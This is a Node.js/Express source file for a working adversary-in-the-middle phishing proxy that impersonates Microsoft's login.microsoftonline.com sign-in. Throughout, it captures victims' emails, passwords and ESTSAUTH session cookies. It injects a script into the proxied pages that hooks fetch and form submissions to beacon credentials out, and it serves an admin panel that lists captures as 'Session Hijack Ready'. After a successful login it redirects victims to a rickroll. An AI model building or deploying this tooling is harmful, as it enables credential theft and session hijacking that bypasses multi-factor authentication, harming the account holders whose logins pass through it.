const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const fs = require('fs');
const zlib = require('zlib');

const app = express();
const PORT = process.env.PORT || 3000;
const RICKROLL = 'https://archive.org/details/MacArthur_Foundation_100andChange_dQw4w9WgXcQ';

// Storage
const CAPTURES_FILE = './captures.json';
if (!fs.existsSync(CAPTURES_FILE)) fs.writeFileSync(CAPTURES_FILE, '[]');

function saveCapture(type, data) {
    const capture = { timestamp: new Date().toISOString(), type, ...data };
    const captures = JSON.parse(fs.readFileSync(CAPTURES_FILE));
    captures.push(capture);
    fs.writeFileSync(CAPTURES_FILE, JSON.stringify(captures, null, 2));
    
    // Console output in human terms
    console.log(`\n[${type.toUpperCase()}] ${new Date().toLocaleTimeString()}`);
    if (data.loginfmt) console.log(`  Email: ${data.loginfmt}`);
    if (data.passwd) console.log(`  Password: ${data.passwd}`);
    if (data.cookies) console.log(`  Session Cookies: ${data.cookies.length} captured`);
    if (data.url) console.log(`  URL: ${data.url}`);
}

// Parse raw body
app.use(express.raw({ type: '*/*', limit: '50mb' }));

// Proxy setup
const proxy = createProxyMiddleware({
    target: 'https://login.microsoftonline.com',
    changeOrigin: true,
    secure: true,
    selfHandleResponse: true,
    
    onProxyReq: (proxyReq, req, res) => {
        const bodyStr = req.body?.toString?.() || '';
        
        // Microsoft uses loginfmt and passwd
        if (req.method === 'POST' && bodyStr) {
            try {
                const params = new URLSearchParams(bodyStr);
                const email = params.get('loginfmt') || params.get('email');
                const pass = params.get('passwd') || params.get('password');
                const flowToken = params.get('flowToken') || params.get('PPFT');
                
                if (email) {
                    saveCapture('credentials', { 
                        loginfmt: email, 
                        passwd: pass || '[waiting for password]',
                        flowToken: flowToken?.substring(0, 20) + '...',
                        ip: req.headers['x-forwarded-for'] || req.ip
                    });
                }
                
                // Also check JSON payloads
                if (req.headers['content-type']?.includes('json')) {
                    const json = JSON.parse(bodyStr);
                    if (json.username || json.login) {
                        saveCapture('credentials', {
                            loginfmt: json.username || json.login,
                            passwd: json.password || json.passwd,
                            ip: req.headers['x-forwarded-for'] || req.ip
                        });
                    }
                }
            } catch(e) {}
        }
        
        // Write to proxy
        if (req.body?.length > 0) {
            proxyReq.write(req.body);
        }
        proxyReq.end();
    },
    
    onProxyRes: (proxyRes, req, res) => {
        let body = [];
        proxyRes.on('data', chunk => body.push(chunk));
        proxyRes.on('end', () => {
            let buffer = Buffer.concat(body);
            const encoding = proxyRes.headers['content-encoding'];
            
            // Decompress
            if (encoding === 'gzip') {
                try { buffer = zlib.gunzipSync(buffer); } catch(e) {}
            } else if (encoding === 'deflate') {
                try { buffer = zlib.inflateSync(buffer); } catch(e) {}
            }
            
            const bodyStr = buffer.toString();
            const contentType = proxyRes.headers['content-type'] || '';
            
            // Capture session cookies (ESTSAUTH = golden ticket)
            if (proxyRes.headers['set-cookie']) {
                const cookies = proxyRes.headers['set-cookie'];
                const estaAuth = cookies.find(c => c.includes('ESTSAUTH'));
                const estaLight = cookies.find(c => c.includes('ESTSAUTHLIGHT'));
                
                saveCapture('session', { 
                    cookies: cookies,
                    hasFullAuth: !!estaAuth,
                    hasLightAuth: !!estaLight,
                    url: req.url
                });
                
                // If we got ESTSAUTH, they successfully logged in - rickroll them
                if (estaAuth || bodyStr.includes('window.location') || proxyRes.statusCode === 302) {
                    console.log('[SUCCESS] Login completed, redirecting to rickroll...');
                    res.statusCode = 302;
                    res.setHeader('Location', RICKROLL);
                    res.end();
                    return;
                }
            }
            
            // Inject credential capture for JS-based submissions
            if (contentType.includes('text/html')) {
                const injection = `
                <script>
                (function() {
                    // Capture fetch/XHR requests (Microsoft uses these)
                    const origFetch = window.fetch;
                    window.fetch = function(url, opts) {
                        if (opts?.body) {
                            const body = opts.body.toString();
                            if (body.includes('loginfmt') || body.includes('passwd')) {
                                navigator.sendBeacon('/capture-js', opts.body);
                            }
                        }
                        return origFetch.apply(this, arguments);
                    };
                    
                    // Capture form submissions
                    document.addEventListener('submit', function(e) {
                        const fd = new FormData(e.target);
                        const data = Object.fromEntries(fd);
                        if (data.loginfmt || data.passwd) {
                            navigator.sendBeacon('/capture-js', JSON.stringify(data));
                        }
                    });
                })();
                </script>`;
                
                if (bodyStr.includes('</head>')) {
                    buffer = Buffer.from(bodyStr.replace('</head>', injection + '</head>'));
                }
            }
            
            // Re-compress
            if (encoding === 'gzip') buffer = zlib.gzipSync(buffer);
            else if (encoding === 'deflate') buffer = zlib.deflateSync(buffer);
            
            res.status(proxyRes.statusCode);
            Object.keys(proxyRes.headers).forEach(key => {
                if (key !== 'content-length') res.setHeader(key, proxyRes.headers[key]);
            });
            res.end(buffer);
        });
    }
});

// Capture endpoint for injected JS
app.post('/capture-js', express.text(), (req, res) => {
    try {
        const data = JSON.parse(req.body);
        if (data.loginfmt || data.passwd) {
            saveCapture('credentials', { ...data, source: 'javascript' });
        }
    } catch(e) {
        // Try URL encoded
        const params = new URLSearchParams(req.body);
        const email = params.get('loginfmt');
        const pass = params.get('passwd');
        if (email) saveCapture('credentials', { loginfmt: email, passwd: pass, source: 'form' });
    }
    res.sendStatus(200);
});

// Admin panel with human-readable logs
app.get('/admin', (req, res) => {
    const captures = JSON.parse(fs.readFileSync(CAPTURES_FILE));
    
    // Decode logs
    const decoded = captures.map(c => {
        let html = `<div style="border:1px solid #333; margin:10px 0; padding:10px; background:#1a1a1a;">`;
        html += `<div style="color:#888; font-size:12px;">${c.timestamp} | ${c.type.toUpperCase()}</div>`;
        
        if (c.loginfmt) {
            html += `<div style="color:#0f0; font-size:16px;"><strong>Email:</strong> ${c.loginfmt}</div>`;
            if (c.passwd) html += `<div style="color:#f00;"><strong>Password:</strong> ${c.passwd}</div>`;
        }
        
        if (c.cookies) {
            const esta = c.cookies.find(x => x.includes('ESTSAUTH'));
            html += `<div style="color:#ff0; font-size:12px;">`;
            html += `<strong>Session Hijack Ready:</strong> ${c.hasFullAuth ? 'YES - Full Auth' : 'Partial'}<br>`;
            if (esta) html += `<code style="word-break:break-all;">${esta.substring(0, 100)}...</code>`;
            html += `</div>`;
        }
        
        if (c.source) html += `<div style="color:#888; font-size:11px;">Source: ${c.source}</div>`;
        html += `</div>`;
        return html;
    }).reverse().join('');
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>AiTM - ${captures.length} Captured</title>
        <style>
            body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
            h1 { color: #fff; }
            .stats { background: #222; padding: 10px; margin: 10px 0; }
        </style>
    </head>
    <body>
        <h1>Captured Sessions: ${captures.length}</h1>
        <div class="stats">
            Credentials: ${captures.filter(c => c.loginfmt).length} | 
            Sessions: ${captures.filter(c => c.cookies).length} |
            Full Auth: ${captures.filter(c => c.hasFullAuth).length}
        </div>
        <button onclick="fetch('/clear',{method:'POST'}).then(()=>location.reload())">Clear All</button>
        <hr>
        ${decoded}
    </body>
    </html>
    `);
});

app.post('/clear', (req, res) => {
    fs.writeFileSync(CAPTURES_FILE, '[]');
    res.json({ cleared: true });
});

app.get('/health', (req, res) => {
    res.json({ status: 'AiTM active' });
});

// Route handling
app.use((req, res, next) => {
    if (req.path.match(/^\/(admin|capture-js|clear|health)/)) next();
    else proxy(req, res, next);
});

app.listen(PORT, () => {
    console.log(`AiTM Proxy on port ${PORT}`);
    console.log(`Rickroll target: ${RICKROLL}`);
});
